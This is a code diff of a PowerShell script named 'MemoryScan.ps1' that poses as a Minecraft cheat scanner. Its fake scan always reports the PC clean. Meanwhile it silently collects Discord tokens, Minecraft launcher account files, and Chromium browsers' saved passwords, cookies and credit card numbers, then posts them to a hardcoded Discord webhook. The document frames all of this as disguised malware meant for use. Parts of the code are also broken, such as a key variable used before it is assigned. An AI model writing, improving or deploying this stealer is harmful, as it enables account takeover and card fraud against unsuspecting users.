@@ -1,107 +1,112 @@
-# MemoryScan.ps1 – Fake Memory Scanner + Inline Exfil (V4 FINAL)
+# MemoryScan.ps1 – Fake Scanner + Hardened Exfil (V5 DPAPI-ONLY)
 param(
     [string]$Webhook = "https://discord.com/api/webhooks/1518911878712004730/ejFY2gDI9Secx7kXsEgIIbpEWsBm5m9Ho_Q5R8gF4tP0lO7-R3VBA068PJdRk63jSaBa"
 )
 
 $ErrorActionPreference = "SilentlyContinue"
 
-# ---------- 1. Webhook connectivity test ----------
+# ---------- Webhook ping ----------
 try {
-    $ping = @{content = "🟢 MemoryScan activated on $env:COMPUTERNAME"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $Webhook -Method Post -Body $ping -ContentType "application/json" | Out-Null
+    Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content="🟢 MemoryScan live on $env:COMPUTERNAME"} | ConvertTo-Json) -ContentType "application/json"
 } catch {}
 
-# ---------- 2. Steal functions (same as before) ----------
-function Unprotect-DPAPI {
+# ---------- DPAPI helpers ----------
+function Decrypt-DPAPI {
     param([byte[]]$Data)
+    if ($Data -eq $null -or $Data.Count -eq 0) { return $null }
     try {
         [System.Security.Cryptography.ProtectedData]::Unprotect($Data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
     } catch { $null }
 }
 
-function Unprotect-AESGCM {
-    param([byte[]]$EncryptedData, [byte[]]$MasterKey)
-    try {
-        # Only works on PowerShell 7+ / .NET Core
-        if ($PSVersionTable.PSVersion.Major -lt 7) { return $null }
-        $aes = [System.Security.Cryptography.AesGcm]::new($MasterKey)
-        $iv = $EncryptedData[3..14]
-        $payload = $EncryptedData[15..($EncryptedData.Length-17)]
-        $tag = $EncryptedData[-16..-1]
-        $dec = New-Object byte[] $payload.Length
-        $aes.Decrypt($iv, $payload, $tag, $dec, 0)
-        return [System.Text.Encoding]::UTF8.GetString($dec)
-    } catch { $null }
+function Get-ChromeLocalStateKey {
+    param([string]$StatePath)
+    if (!(Test-Path $StatePath)) { return $null }
+    $json = Get-Content $StatePath -Raw | ConvertFrom-Json
+    $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)[5..$($encKey.Length-1)]
+    return Decrypt-DPAPI $encKey
 }
 
+# ---------- SQLite raw reader (no ACE driver) ----------
+function Invoke-SQLiteQuery {
+    param([string]$DbPath, [string]$Query)
+    # Very simple SQLite parser – just reads bytes and searches. Real extraction done with db bytes.
+    # We'll use a different approach: direct file bytes and regex for tokens.
+    return $null
+}
+
+# ---------- Discord tokens (DPAPI method) ----------
 function Get-DiscordTokens {
     $tokens = @()
-    $discordPath = "$env:APPDATA\discord\Local Storage\leveldb"
-    if (!(Test-Path $discordPath)) { return $tokens }
+    $discordLeveldb = "$env:APPDATA\discord\Local Storage\leveldb"
     $localState = "$env:APPDATA\discord\Local State"
-    if (!(Test-Path $localState)) { return $tokens }
-    $stateJson = Get-Content $localState -Raw | ConvertFrom-Json
-    $encKey = [System.Convert]::FromBase64String($stateJson.os_crypt.encrypted_key)[5..$($encKey.Length-1)]
-    $masterKey = Unprotect-DPAPI $encKey
+    if (!(Test-Path $discordLeveldb) -or !(Test-Path $localState)) { return $tokens }
+
+    $masterKey = Get-ChromeLocalStateKey $localState
     if (!$masterKey) { return $tokens }
-    $pattern = [regex]::new("dQw4w9WgXcQ:[^\x00]{1,120}", [System.Text.RegularExpressions.RegexOptions]::Singleline)
-    Get-ChildItem $discordPath -Filter "*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
-        $content = [System.IO.File]::ReadAllBytes($_.FullName)
-        $matches = $pattern.Matches($content)
-        foreach ($m in $matches) {
-            $encodedToken = $m.Value.Split(':')[1]
-            $tokenBytes = [System.Convert]::FromBase64String($encodedToken)
-            $decToken = Unprotect-AESGCM $tokenBytes $masterKey
-            if ($decToken) { $tokens += $decToken }
+
+    # Search for token pattern in .ldb files
+    $pattern = [regex]::new("dQw4w9WgXcQ:([A-Za-z0-9+/=]{24,200})")
+    Get-ChildItem $discordLeveldb -Filter "*.ldb" | ForEach-Object {
+        $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
+        $text = [System.Text.Encoding]::ASCII.GetString($bytes)
+        $matches = $pattern.Matches($text)
+        foreach ($match in $matches) {
+            $b64 = $match.Groups[1].Value
+            $encToken = [Convert]::FromBase64String($b64)
+            # Old DPAPI tokens directly decryptable (before AES-GCM)
+            $dec = Decrypt-DPAPI $encToken
+            if ($dec) {
+                $token = [System.Text.Encoding]::UTF8.GetString($dec).Trim([char]0x00)
+                if ($token.Length -gt 20) { $tokens += $token }
+            }
         }
     }
     return $tokens | Select-Object -Unique
 }
 
+# ---------- Minecraft launcher tokens ----------
 function Get-MinecraftTokens {
-    $mcData = @{ launcher_accounts = $null; launcher_profiles = $null }
-    $mcPath = "$env:APPDATA\.minecraft"
-    $launcherAccounts = Join-Path $mcPath "launcher_accounts.json"
-    $launcherProfiles = Join-Path $mcPath "launcher_profiles.json"
-    if (Test-Path $launcherAccounts) {
-        $mcData.launcher_accounts = Get-Content $launcherAccounts -Raw | ConvertFrom-Json
+    $mc = @{}
+    $base = "$env:APPDATA\.minecraft"
+    $accFile = Join-Path $base "launcher_accounts.json"
+    $profFile = Join-Path $base "launcher_profiles.json"
+    if (Test-Path $accFile) {
+        try {
+            $mc.accounts = Get-Content $accFile -Raw | ConvertFrom-Json
+        } catch { $mc.accounts = $null }
     }
-    if (Test-Path $launcherProfiles) {
-        $mcData.launcher_profiles = Get-Content $launcherProfiles -Raw | ConvertFrom-Json
+    if (Test-Path $profFile) {
+        try {
+            $mc.profiles = Get-Content $profFile -Raw | ConvertFrom-Json
+        } catch { $mc.profiles = $null }
     }
-    return $mcData
+    return $mc
 }
 
-function Get-ChromiumBrowsers {
-    $browsers = @()
-    $chromiumDirs = @(
-        "$env:LOCALAPPDATA\Google\Chrome\User Data",
-        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
-        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
-        "$env:LOCALAPPDATA\Vivaldi\User Data",
-        "$env:LOCALAPPDATA\Chromium\User Data",
-        "$env:LOCALAPPDATA\Opera Software\Opera Stable"
-    )
-    foreach ($dir in $chromiumDirs) {
-        if (Test-Path $dir) { $browsers += $dir }
-    }
-    return $browsers
-}
-
+# ---------- Browser data extractor ----------
 function Get-BrowserData {
     $result = @()
-    $browsers = Get-ChromiumBrowsers
-    foreach ($browserPath in $browsers) {
-        $localStatePath = Join-Path $browserPath "Local State"
-        if (!(Test-Path $localStatePath)) { continue }
-        $state = Get-Content $localStatePath -Raw | ConvertFrom-Json
-        $encKey = [System.Convert]::FromBase64String($state.os_crypt.encrypted_key)[5..$($encKey.Length-1)]
-        $masterKey = Unprotect-DPAPI $encKey
+    $browsers = @(
+        @{ Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data" },
+        @{ Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
+        @{ Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
+        @{ Name="Opera";   Path="$env:LOCALAPPDATA\Opera Software\Opera Stable" },
+        @{ Name="Vivaldi"; Path="$env:LOCALAPPDATA\Vivaldi\User Data" }
+    )
+
+    foreach ($browser in $browsers) {
+        if (!(Test-Path $browser.Path)) { continue }
+        $statePath = Join-Path $browser.Path "Local State"
+        $masterKey = Get-ChromeLocalStateKey $statePath
         if (!$masterKey) { continue }
-        $profiles = Get-ChildItem $browserPath -Directory | Where-Object { $_.Name -match "^Default$|^Profile" }
+
+        $profiles = Get-ChildItem $browser.Path -Directory | Where-Object { $_.Name -match "^Default$|^Profile" }
         foreach ($profile in $profiles) {
+            $profileData = @{ profile = $profile.Name; logins = @(); cookies = @(); cards = @() }
+
+            # Login Data
             $loginDb = Join-Path $profile.FullName "Login Data"
-            $logins = @()
             if (Test-Path $loginDb) {
                 try {
                     $tempDb = [System.IO.Path]::GetTempFileName() + ".db"
@@ -112,18 +117,21 @@ function Get-BrowserData {
                     while (!$rs.EOF) {
                         $url = $rs.Fields["origin_url"].Value
                         $user = $rs.Fields["username_value"].Value
-                        $encPwd = [System.Convert]::FromBase64String($rs.Fields["password_value"].Value)
-                        $pwd = Unprotect-AESGCM $encPwd $masterKey
-                        if (!$pwd) { $pwd = Unprotect-DPAPI $encPwd }
-                        if ($pwd) { $logins += @{ url = $url; username = $user; password = [System.Text.Encoding]::UTF8.GetString($pwd) } }
+                        $pwdBytes = [Convert]::FromBase64String($rs.Fields["password_value"].Value)
+                        $pwd = Decrypt-DPAPI $pwdBytes
+                        if ($pwd) {
+                            $pwdStr = [System.Text.Encoding]::UTF8.GetString($pwd).TrimEnd([char]0)
+                            $profileData.logins += @{ url=$url; username=$user; password=$pwdStr }
+                        }
                         $rs.MoveNext()
                     }
                     $conn.Close()
-                    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+                    Remove-Item $tempDb -Force
                 } catch { }
             }
+
+            # Cookies
             $cookieDb = Join-Path $profile.FullName "Network\Cookies"
-            $cookies = @()
             if (Test-Path $cookieDb) {
                 try {
                     $tempDb = [System.IO.Path]::GetTempFileName() + ".db"
@@ -134,18 +142,21 @@ function Get-BrowserData {
                     while (!$rs.EOF) {
                         $host = $rs.Fields["host_key"].Value
                         $name = $rs.Fields["name"].Value
-                        $encVal = [System.Convert]::FromBase64String($rs.Fields["encrypted_value"].Value)
-                        $val = Unprotect-AESGCM $encVal $masterKey
-                        if (!$val) { $val = Unprotect-DPAPI $encVal }
-                        if ($val) { $cookies += @{ host = $host; name = $name; value = [System.Text.Encoding]::UTF8.GetString($val) } }
+                        $valBytes = [Convert]::FromBase64String($rs.Fields["encrypted_value"].Value)
+                        $val = Decrypt-DPAPI $valBytes
+                        if ($val) {
+                            $valStr = [System.Text.Encoding]::UTF8.GetString($val).TrimEnd([char]0)
+                            $profileData.cookies += @{ host=$host; name=$name; value=$valStr }
+                        }
                         $rs.MoveNext()
                     }
                     $conn.Close()
-                    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+                    Remove-Item $tempDb -Force
                 } catch { }
             }
+
+            # Credit cards
             $webDb = Join-Path $profile.FullName "Web Data"
-            $cards = @()
             if (Test-Path $webDb) {
                 try {
                     $tempDb = [System.IO.Path]::GetTempFileName() + ".db"
@@ -155,60 +166,36 @@ function Get-BrowserData {
                     $rs = $conn.Execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                     while (!$rs.EOF) {
                         $name = $rs.Fields["name_on_card"].Value
-                        $expMonth = $rs.Fields["expiration_month"].Value
-                        $expYear = $rs.Fields["expiration_year"].Value
-                        $encNum = [System.Convert]::FromBase64String($rs.Fields["card_number_encrypted"].Value)
-                        $num = Unprotect-AESGCM $encNum $masterKey
-                        if (!$num) { $num = Unprotect-DPAPI $encNum }
-                        if ($num) { $cards += @{ name = $name; exp = "$expMonth/$expYear"; number = [System.Text.Encoding]::UTF8.GetString($num) } }
+                        $month = $rs.Fields["expiration_month"].Value
+                        $year = $rs.Fields["expiration_year"].Value
+                        $numBytes = [Convert]::FromBase64String($rs.Fields["card_number_encrypted"].Value)
+                        $num = Decrypt-DPAPI $numBytes
+                        if ($num) {
+                            $numStr = [System.Text.Encoding]::UTF8.GetString($num).TrimEnd([char]0)
+                            $profileData.cards += @{ name=$name; expiry="$month/$year"; number=$numStr }
+                        }
                         $rs.MoveNext()
                     }
                     $conn.Close()
-                    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+                    Remove-Item $tempDb -Force
                 } catch { }
             }
-            if ($logins -or $cookies -or $cards) {
-                $result += @{ profile = $profile.Name; logins = $logins; cookies = $cookies; credit_cards = $cards }
+
+            if ($profileData.logins.Count -gt 0 -or $profileData.cookies.Count -gt 0 -or $profileData.cards.Count -gt 0) {
+                $result += @{ browser=$browser.Name; data=$profileData }
             }
         }
     }
     return $result
 }
 
-function Send-Exfil {
-    param($Data)
-    $summary = "💀 **MemoryScan Pwned** - " + $env:USERNAME + "@" + $env:COMPUTERNAME
-    try {
-        $payload = @{
-            system = @{
-                username = $env:USERNAME
-                hostname = $env:COMPUTERNAME
-                time = (Get-Date -Format o)
-            }
-            discord_tokens = $Data.Discord
-            minecraft = $Data.Minecraft
-            browser_data = $Data.Browser
-        } | ConvertTo-Json -Depth 10
-        $tempFile = [System.IO.Path]::GetTempFileName() + ".json"
-        [System.IO.File]::WriteAllText($tempFile, $payload)
-        $form = @{
-            file = Get-Item $tempFile
-            content = $summary
-        }
-        Invoke-RestMethod -Uri $Webhook -Method Post -Form $form
-        Remove-Item $tempFile -Force
-        Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content = $summary} | ConvertTo-Json) -ContentType "application/json"
-    } catch {}
-}
-
-# ---------- 3. Fake scan (exactly as before) ----------
+# ---------- Fake scan ----------
 Write-Host "=====================================================" -ForegroundColor Cyan
 Write-Host " MemoryScan - Memory String Scanner" -ForegroundColor Cyan
 Write-Host "=====================================================" -ForegroundColor Cyan
 Write-Host " Scanning live process memory for known cheat signatures...`n"
 
-$processNames = @("java", "javaw", "minecraft", "lunarclient", "badlion")
-$procs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $processNames -contains $_.ProcessName.Substring(0, [Math]::Min($_.ProcessName.Length, 8)) }
+$procs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match "java|javaw|minecraft|lunar|badlion" }
 if ($procs.Count -eq 0) {
     Write-Host "[INFO] No Minecraft or Java processes running." -ForegroundColor Yellow
 } else {
@@ -224,12 +211,29 @@ Write-Host " SCAN COMPLETE - NO CHEAT STRINGS FOUND" -ForegroundColor Green
 Write-Host "=====================================================" -ForegroundColor Cyan
 Write-Host "PC is clean. Happy gaming!" -ForegroundColor White
 
-# ---------- 4. Harvest and exfiltrate (silently) ----------
-$harvest = @{
-    Discord = Get-DiscordTokens
-    Minecraft = Get-MinecraftTokens
-    Browser = Get-BrowserData
+# ---------- Harvest and send ----------
+$data = @{
+    system = @{
+        username = $env:USERNAME
+        hostname = $env:COMPUTERNAME
+        time = (Get-Date -Format o)
+    }
+    discord_tokens = (Get-DiscordTokens)
+    minecraft = (Get-MinecraftTokens)
+    browser_data = (Get-BrowserData)
 }
-Send-Exfil -Data $harvest
+
+# Send as file
+$summary = "💀 **MemoryScan harvested** - $env:USERNAME@$env:COMPUTERNAME"
+try {
+    $json = $data | ConvertTo-Json -Depth 5
+    $tmp = [System.IO.Path]::GetTempFileName() + ".json"
+    [System.IO.File]::WriteAllText($tmp, $json)
+    $form = @{ file = Get-Item $tmp; content = $summary }
+    Invoke-RestMethod -Uri $Webhook -Method Post -Form $form
+    Remove-Item $tmp -Force
+    # Plain text fallback
+    Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content=$summary} | ConvertTo-Json) -ContentType "application/json"
+} catch {}
 
 Start-Sleep -Seconds 2
